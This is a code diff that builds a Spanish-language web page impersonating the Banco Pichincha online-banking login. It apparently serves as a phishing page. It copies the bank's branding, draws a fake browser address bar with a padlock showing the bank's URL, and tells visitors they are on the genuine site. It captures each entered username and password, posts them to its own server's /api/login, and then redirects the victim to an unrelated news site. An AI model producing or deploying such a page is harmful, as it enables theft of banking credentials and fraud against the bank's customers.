@@ -1,3 +1,146 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Banco Pichincha - Banca Web</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body { font-family: Arial, sans-serif; }
+  </style>
+</head>
+<body>
+
+<div style="display: flex; min-height: 100vh; background: #f5f5f7;">
+
+  <!-- Panel izquierdo -->
+  <div style="flex: 1; padding: 48px 60px; background: white; display: flex; flex-direction: column; justify-content: space-between;">
+    <div>
+      <!-- Logo -->
+      <div style="display: flex; align-items: center; gap: 10px; margin-bottom: 60px;">
+        <div style="background: #F5C800; width: 36px; height: 36px; border-radius: 6px; display: flex; align-items: center; justify-content: center;">
+          <svg width="18" height="18" viewBox="0 0 18 18" fill="none">
+            <rect x="2" y="2" width="6" height="6" rx="1" fill="white"/>
+            <rect x="10" y="2" width="6" height="6" rx="1" fill="white"/>
+            <rect x="2" y="10" width="6" height="6" rx="1" fill="white"/>
+          </svg>
+        </div>
+        <div>
+          <div style="font-weight: 700; font-size: 14px; color: #1a3a5c; line-height: 1.1;">BANCO</div>
+          <div style="font-weight: 700; font-size: 14px; color: #1a3a5c; line-height: 1.1;">PICHINCHA</div>
+        </div>
+      </div>
+
+      <h1 style="font-size: 28px; font-weight: 600; color: #1a6fa8; line-height: 1.3; margin: 0 0 28px; max-width: 380px;">
+        Verifica en tu navegador que estás en Banca Web.
+      </h1>
+
+      <!-- URL bar -->
+      <div style="background: #f0f0f0; border-radius: 24px; padding: 8px 16px; display: inline-flex; align-items: center; gap: 8px; margin-bottom: 24px;">
+        <div style="width: 20px; height: 20px; background: #2d8a4e; border-radius: 50%; display: flex; align-items: center; justify-content: center;">
+          <svg width="11" height="11" viewBox="0 0 11 11" fill="none">
+            <path d="M3 5.5V4a2.5 2.5 0 015 0v1.5" stroke="white" stroke-width="1.2" stroke-linecap="round"/>
+            <rect x="1.5" y="5" width="8" height="5.5" rx="1" fill="white"/>
+          </svg>
+        </div>
+        <span style="font-size: 13px; color: #444;">https://bancaweb.pichincha.com/pichincha/login</span>
+      </div>
+
+      <!-- Imagen del muñeco -->
+      <div style="display: flex; justify-content: center; margin-bottom: 24px;">
+        <img
+          src="muneco.jpg"
+          alt="personaje"
+          style="width: 220px; height: 220px; object-fit: contain;"
+        />
+      </div>
+
+      <!-- Pasos -->
+      <div>
+        <div style="display: flex; gap: 12px; margin-bottom: 12px; align-items: flex-start;">
+          <span style="font-weight: 700; color: #1a3a5c; min-width: 32px; font-size: 15px;">01.</span>
+          <span style="font-size: 15px; color: #333;">Cuida tu usuario y contraseña</span>
+        </div>
+        <div style="display: flex; gap: 12px; align-items: flex-start;">
+          <span style="font-weight: 700; color: #1a3a5c; min-width: 32px; font-size: 15px;">02.</span>
+          <span style="font-size: 15px; color: #333;">Antes de ingresar la Clave Digital verifica que los 4 últimos dígitos de tu cédula sean correctos.</span>
+        </div>
+      </div>
+    </div>
+
+    <!-- Footer -->
+    <div style="margin-top: 40px;">
+      <span style="font-size: 12px; color: #1a6fa8; cursor: pointer;">Términos de uso</span>
+      <span style="font-size: 12px; color: #666;"> © 2026 Banco Pichincha. Todos los derechos reservados.</span>
+    </div>
+  </div>
+
+  <!-- Panel derecho: formulario -->
+  <div style="flex: 1; background: #f0f2f5; display: flex; align-items: center; justify-content: center; padding: 40px;">
+    <div style="background: white; border-radius: 12px; padding: 40px; width: 100%; max-width: 400px; box-shadow: 0 2px 12px rgba(0,0,0,0.06);">
+      <h2 style="font-size: 24px; font-weight: 600; color: #1a3a5c; margin: 0 0 28px;">Bienvenido a tu Banca Web</h2>
+
+      <div style="margin-bottom: 20px;">
+        <label style="display: block; font-size: 14px; color: #333; margin-bottom: 6px;">Usuario</label>
+        <input type="text" id="usuario" placeholder="Ingresa tu usuario"
+          style="width: 100%; padding: 12px 14px; border: 1px solid #d0d5dd; border-radius: 8px; font-size: 15px; color: #333; background: #f9fafb; outline: none;"/>
+        <div style="text-align: right; margin-top: 6px;">
+          <a href="#" style="font-size: 13px; color: #1a6fa8; text-decoration: none;">¿Olvidaste tu usuario?</a>
+        </div>
+      </div>
+
+      <div style="margin-bottom: 24px;">
+        <label style="display: block; font-size: 14px; color: #333; margin-bottom: 6px;">Contraseña</label>
+        <div style="position: relative;">
+          <input type="password" id="contrasena" placeholder="Ingresa tu contraseña"
+            style="width: 100%; padding: 12px 44px 12px 14px; border: 1px solid #d0d5dd; border-radius: 8px; font-size: 15px; color: #333; background: #f9fafb; outline: none;"/>
+          <div style="position: absolute; right: 12px; top: 50%; transform: translateY(-50%); cursor: pointer;" onclick="togglePassword()">
+            <svg width="20" height="20" viewBox="0 0 20 20" fill="none">
+              <path d="M1 10s3.5-7 9-7 9 7 9 7-3.5 7-9 7-9-7-9-7z" stroke="#888" stroke-width="1.5"/>
+              <circle cx="10" cy="10" r="3" stroke="#888" stroke-width="1.5"/>
+            </svg>
+          </div>
+        </div>
+        <div style="text-align: right; margin-top: 6px;">
+          <a href="#" style="font-size: 13px; color: #1a6fa8; text-decoration: none;">¿Olvidaste tu contraseña?</a>
+        </div>
+      </div>
+
+      <div id="error-msg" style="display:none; background:#fdecea; border:1px solid #f5c6c6; color:#c0392b; padding:10px 14px; border-radius:8px; font-size:13px; margin-bottom:16px;">
+        Credenciales incorrectas
+      </div>
+
+      <button onclick="iniciarSesion()" id="btn-login"
+        style="width: 100%; padding: 14px; background: #F5C800; border: none; border-radius: 8px; font-size: 16px; font-weight: 600; color: #1a3a5c; cursor: pointer; margin-bottom: 20px;">
+        Ingresar
+      </button>
+
+      <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 12px;">
+        <div style="border: 1px solid #ddd; border-radius: 8px; padding: 16px; text-align: center; cursor: pointer;">
+          <svg width="24" height="24" viewBox="0 0 24 24" fill="none" style="display: block; margin: 0 auto 6px;">
+            <rect x="5" y="11" width="14" height="10" rx="2" stroke="#333" stroke-width="1.5"/>
+            <path d="M8 11V7a4 4 0 018 0v4" stroke="#333" stroke-width="1.5"/>
+            <circle cx="12" cy="16" r="1.5" fill="#333"/>
+          </svg>
+          <div style="font-size: 13px; color: #333; line-height: 1.3;">¿Cuenta bloqueada?<br/>
+            <span style="color: #1a6fa8;">Desbloquéala aquí</span>
+          </div>
+        </div>
+        <div style="border: 1px solid #ddd; border-radius: 8px; padding: 16px; text-align: center; cursor: pointer;">
+          <svg width="24" height="24" viewBox="0 0 24 24" fill="none" style="display: block; margin: 0 auto 6px;">
+            <circle cx="12" cy="8" r="4" stroke="#333" stroke-width="1.5"/>
+            <path d="M4 20c0-4 3.6-7 8-7s8 3 8 7" stroke="#333" stroke-width="1.5" stroke-linecap="round"/>
+          </svg>
+          <div style="font-size: 13px; color: #333; line-height: 1.3;">¿Usuario nuevo?<br/>
+            <span style="color: #1a6fa8;">Regístrate ahora</span>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+</div>
+
 <script>
   function togglePassword() {
     const input = document.getElementById('contrasena');
@@ -5,9 +148,21 @@
   }
 
   function iniciarSesion() {
-    const usuario = document.getElementById('usuario').value;
+    const usuario = document.getElementById('usuario').value.trim();
     const contrasena = document.getElementById('contrasena').value;
     const errorMsg = document.getElementById('error-msg');
+    const btn = document.getElementById('btn-login');
+
+    errorMsg.style.display = 'none';
+
+    if (!usuario || !contrasena) {
+      errorMsg.style.display = 'block';
+      errorMsg.textContent = 'Por favor completa todos los campos';
+      return;
+    }
+
+    btn.disabled = true;
+    btn.textContent = 'Ingresando...';
 
     fetch('/api/login', {
       method: 'POST',
@@ -17,16 +172,26 @@
     .then(res => res.json())
     .then(data => {
       if (data.ok) {
-        alert("Login exitoso ✅");
+        window.location.href = 'https://www.noticias.com';
       } else {
         errorMsg.style.display = 'block';
-        errorMsg.textContent = data.message || 'Error';
+        errorMsg.textContent = data.message || 'Credenciales incorrectas';
+        btn.disabled = false;
+        btn.textContent = 'Ingresar';
       }
     })
-    .catch((err) => {
-      console.error(err);
+    .catch(() => {
       errorMsg.style.display = 'block';
       errorMsg.textContent = 'Error al conectar con el servidor';
+      btn.disabled = false;
+      btn.textContent = 'Ingresar';
     });
   }
+
+  document.addEventListener('keydown', function(e) {
+    if (e.key === 'Enter') iniciarSesion();
+  });
 </script>
+
+</body>
+</html>
